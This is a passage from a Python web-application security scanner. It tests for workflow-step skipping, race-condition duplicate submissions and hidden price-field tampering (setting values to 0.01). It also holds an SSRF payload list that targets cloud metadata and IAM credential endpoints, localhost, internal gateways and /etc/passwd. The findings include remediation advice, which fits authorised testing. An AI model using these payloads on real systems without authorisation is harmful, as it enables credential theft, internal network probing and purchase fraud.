                    title="Business Logic — Workflow Step Directly Accessible",
                    url=lnk, port=target["port"], risk="HIGH",
                    description=(
                        f"Late-stage workflow page '{lnk}' returned HTTP {r.status_code} "
                        f"when accessed directly with a fresh (unauthenticated) session. "
                        f"This may allow skipping payment, verification, or approval steps."
                    ),
                    output=f"URL: {lnk}\nHTTP {r.status_code} (unauthenticated fresh session)",
                    output_file=",".join(_ev_files) if _ev_files else "",
                    sources="fracture-business-logic", service=target["scheme"],
                    affected=lnk,
                    owasp="A04:2025 Insecure Design", nist="AC-3",
                    remediation=(
                        "Enforce server-side state machine validation. Confirm all prior "
                        "workflow steps are complete before processing late-stage requests."
                    ),
                    http_code=r.status_code,
                )
                vc.log(f"[business_logic] Workflow skip: {lnk}", "SUCCESS")
        except Exception:
            pass

    # 3. Race condition — concurrent duplicate submission on workflow forms
    vc.status(phase, "Business Logic", "running", "Race condition testing", 2, 4)
    workflow_forms = [
        f for f in forms if _BL_WORKFLOW_URL.search(
            f.get("action", "") + " ".join(
                i.get("name", "") for i in f.get("inputs", [])
            )
        )
        and not _BL_WORKFLOW_EXCLUDE.search(f.get("action", ""))
    ]
    for form in workflow_forms[:5]:
        action = form.get("action", url)
        method = form.get("method", "GET").upper()
        inputs = form.get("inputs", [])
        data   = {i["name"]: i.get("value", "test") for i in inputs if i.get("name")}
        results: list = []  # list of requests.Response objects

        def _race_req(_idx, _action=action, _method=method, _data=data):
            try:
                r = (sess.post(_action, data=_data, timeout=timeout)
                     if _method == "POST"
                     else sess.get(_action, params=_data, timeout=timeout))
                if r is not None:
                    results.append(r)
            except Exception:
                pass

        with ThreadPoolExecutor(max_workers=threads) as pool:
            list(pool.map(_race_req, range(threads)))

        successes = [r for r in results if r.status_code in (200, 201)]
        if len(successes) > 1:
            # Capture all concurrent request/response pairs as evidence
            evidence_files: list = []
            for _ri, _resp in enumerate(results):
                try:
                    _rq, _rp = _save_http_evidence(
                        out, phase, f"race_cond_{_ri + 1:02d}",
                        _resp, endpoint_url=action, method=method)
                    evidence_files.extend([_rq, _rp])
                except Exception:
                    pass
            out.add_finding(
                title="Business Logic — Potential Race Condition (Duplicate Submission)",
                url=action, port=target["port"], risk="HIGH",
                description=(
                    f"Sending {len(results)} concurrent requests to {action} yielded "
                    f"{len(successes)} successful responses. This may indicate a race "
                    f"condition allowing duplicate operations such as double-spend, "
                    f"coupon reuse, or duplicate order creation."
                ),
                output=(
                    f"URL: {action}\nConcurrent requests: {len(results)}\n"
                    f"Successful responses: {len(successes)}\n"
                    + "\n".join(
                        f"  [{i+1}] HTTP {r.status_code} ({len(r.content)} bytes)"
                        for i, r in enumerate(results)
                    )
                ),
                output_file=",".join(evidence_files),
                sources="fracture-business-logic", service=target["scheme"],
                affected=action,
                owasp="A04:2025 Insecure Design", nist="SC-5",
                remediation=(
                    "Use idempotency keys for transaction-forming requests. "
                    "Apply database-level locks or atomic check-and-set operations. "
                    "Add per-session duplicate detection with short TTL deduplication."
                ),
            )
            vc.log(f"[business_logic] Race condition: {action} ({len(successes)}/{len(results)} success)", "SUCCESS")

    # 4. Hidden price / discount field tampering
    vc.status(phase, "Business Logic", "running", "Parameter tampering", 3, 4)
    for form in forms[:30]:
        action = form.get("action", url)
        method = form.get("method", "GET").upper()
        inputs = form.get("inputs", [])
        hidden_price = [
            i for i in inputs if i.get("name")
            and i.get("type", "").lower() in ("hidden", "")
            and _BL_NUMERIC_FIELDS.search(i.get("name", "") + i.get("id", ""))
        ]
        if not hidden_price:
            continue
        for hf in hidden_price:
            orig_val = str(hf.get("value", ""))
            if not orig_val or not re.match(r'^\d[\d.]*$', orig_val):
                continue
            try:
                tamper = {i["name"]: i.get("value", "test") for i in inputs if i.get("name")}
                tamper[hf["name"]] = "0.01"
                r = (sess.post(action, data=tamper, timeout=timeout, allow_redirects=True)
                     if method == "POST"
                     else sess.get(action, params=tamper, timeout=timeout, allow_redirects=True))
                if r and r.status_code in (200, 201, 302):
                    if _inj_is_login_page(r):
                        continue
                    _ev_files: list = []
                    try:
                        _rq, _rp = _save_http_evidence(
                            out, phase, f"price_tamper_{hf['name'][:30]}",
                            r, endpoint_url=action, method=method)
                        _ev_files = [_rq, _rp]
                    except Exception:
                        pass
                    out.add_finding(
                        title="Business Logic — Hidden Price/Value Field Tampering",
                        url=action, port=target["port"], risk="HIGH",
                        description=(
                            f"Hidden field '{hf['name']}' in form at {action} was "
                            f"tampered from '{orig_val}' to '0.01' and the server accepted "
                            f"the submission (HTTP {r.status_code}). Server-side price "
                            f"recalculation may be absent."
                        ),
                        output=(
                            f"Field: {hf['name']}\nOriginal: {orig_val}\n"
                            f"Tampered: 0.01\nHTTP {r.status_code}"
                        ),
                        output_file=",".join(_ev_files) if _ev_files else "",
                        sources="fracture-business-logic", service=target["scheme"],
                        affected=action,
                        owasp="A04:2025 Insecure Design", nist="AC-3",
                        remediation=(
                            "Never trust client-submitted prices or discounts. Store all "
                            "financial values server-side and recalculate totals from "
                            "authoritative data before processing any transaction."
                        ),
                        http_code=r.status_code,
                    )
                    vc.log(f"[business_logic] Price tamper accepted: {action} field={hf['name']}", "SUCCESS")
            except Exception:
                pass

    vc.status(phase, "Business Logic", "complete", "Done", 4, 4)
    vc.log("[business_logic] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 6: SSRF
# ─────────────────────────────────────────────
_SSRF_PARAMS = {"url", "redirect", "webhook", "callback", "next", "return",
                "image", "avatar", "fetch", "uri", "src", "host", "endpoint",
                "dest", "destination", "path", "data", "link", "target"}
_SSRF_PAYLOADS = [
    ("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM creds"),
    ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
    ("http://100.100.100.200/latest/meta-data/", "Alibaba metadata"),
    ("http://127.0.0.1/", "Localhost"),
    ("http://localhost/", "Localhost (named)"),
    ("http://127.0.0.1:22/", "Localhost:22 (SSH)"),
    ("http://192.168.1.1/", "Internal gateway"),
    ("file:///etc/passwd", "File scheme LFI"),
]
_SSRF_RESPONSE_INDICATORS = re.compile(
    r'ami-id|instance-id|security-credentials|169\.254|computeMetadata|'
    r'root:.*:/bin/|OpenSSH|SSH-\d', re.I
)


def _phase_ssrf(target: dict, cfg: dict, pm: ProgressManager,
                out: OutputManager, sess: requests.Session,
                crawl_data: dict) -> None:
    phase   = "ssrf"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    params  = crawl_data.get("params", [])
    vc.status(phase, "SSRF Testing", "running", "Param discovery", 0, len(params))

    ssrf_params = [(e["url"], p) for e in params for p in e["params"]
                   if p.lower() in _SSRF_PARAMS]

    for idx, (purl, param) in enumerate(ssrf_params):
        vc.status(phase, "SSRF Testing", "running", f"Testing {param}", idx, len(ssrf_params))
        for ssrf_payload, ssrf_desc in _SSRF_PAYLOADS:
            r = _qs_inject(purl, param, ssrf_payload, sess, timeout)
            if r and (r.status_code == 200 and len(r.text) > 10 or
                      _SSRF_RESPONSE_INDICATORS.search(r.text)):
                _ssrf_ev = ""
                try:
                    _ssrf_rq, _ssrf_rp = _save_http_evidence(
                        out, phase, f"ssrf_{param}", r)
                    _ssrf_ev = json.dumps(
                        [{"url": purl, "req": str(_ssrf_rq), "resp": str(_ssrf_rp)}])
                except Exception:
                    pass
                out.add_finding(
                    title=f"Server-Side Request Forgery (SSRF) — {ssrf_desc}",
                    url=purl, port=target["port"], risk="CRITICAL",
                    description=f"SSRF confirmed via parameter '{param}'. Target: {ssrf_payload}",
                    output=f"Parameter: {param}\nPayload: {ssrf_payload}\nResponse: {r.text[:500]}",
                    sources="fracture-ssrf", service=target["scheme"],
                    output_file=_ssrf_ev,
                    affected=f"{purl}?{param}={ssrf_payload}",
                    owasp="A10:2025 Server-Side Request Forgery", nist="SC-7",
                    remediation="Validate and restrict URLs supplied by users. Use an allowlist of permitted destinations.",
                    http_code=r.status_code,
                )
                vc.log(f"[ssrf] SSRF via {param}: {ssrf_desc}", "SUCCESS")
                break

    # Blind SSRF — timing-based detection (closed port vs. potentially open internal)
    _blind_ssrf_targets = [
        ("http://127.0.0.1:80/",    "localhost:80"),
        ("http://127.0.0.1:8080/",  "localhost:8080"),
        ("http://10.0.0.1/",        "RFC-1918 10.x gateway"),
        ("http://172.16.0.1/",      "RFC-1918 172.16.x gateway"),
        ("http://192.168.1.1/",     "RFC-1918 192.168.1.1 gateway"),
    ]
    # Use a fast-refuse address as baseline
    import time as _time
    for purl, param in ssrf_params[:3]:
        for blind_target, blind_desc in _blind_ssrf_targets:
            try:
                t0 = _time.monotonic()
                r = _qs_inject(purl, param, blind_target, sess, max(3, timeout // 3))
                elapsed = _time.monotonic() - t0
                # A response with content (not just a connection error) to an
                # internal address strongly suggests the server fetched it
                if r and r.status_code == 200 and len(r.text) > 20:
                    _bssrf_ev = ""
                    try:
                        _bssrf_rq, _bssrf_rp = _save_http_evidence(
                            out, phase, f"blind_ssrf_{param}", r)
                        _bssrf_ev = json.dumps(
                            [{"url": purl, "req": str(_bssrf_rq), "resp": str(_bssrf_rp)}])
                    except Exception:
                        pass
                    out.add_finding(
                        title="Blind SSRF — Internal Network Probing",
                        url=purl, port=target["port"], risk="HIGH",
                        description=(f"Blind SSRF detected: parameter '{param}' appears to have fetched "
                                     f"the internal address {blind_target} ({blind_desc}). "
                                     f"The server returned a 200 response with {len(r.text)} bytes of content."),
                        output=(f"Parameter: {param}\nTarget: {blind_target}\n"
                                f"Response: HTTP {r.status_code}, {len(r.text)} bytes\n{r.text[:300]}"),
                        sources="fracture-ssrf", service=target["scheme"],
                        output_file=_bssrf_ev,
                        affected=f"{purl}?{param}={blind_target}",
                        owasp="A10:2025 Server-Side Request Forgery", nist="SC-7",
                        remediation=(
                            "Block requests to RFC-1918 and loopback addresses. "
                            "Implement an allowlist of permitted outbound destinations."
                        ),
                        http_code=r.status_code,
                    )
                    vc.log(f"[ssrf] Blind SSRF via {param} → {blind_desc}", "SUCCESS")
                    break
            except Exception:
                pass

    vc.status(phase, "SSRF Testing", "complete", "Done", len(ssrf_params), len(ssrf_params))
    vc.log("[ssrf] Phase complete", "SUCCESS")


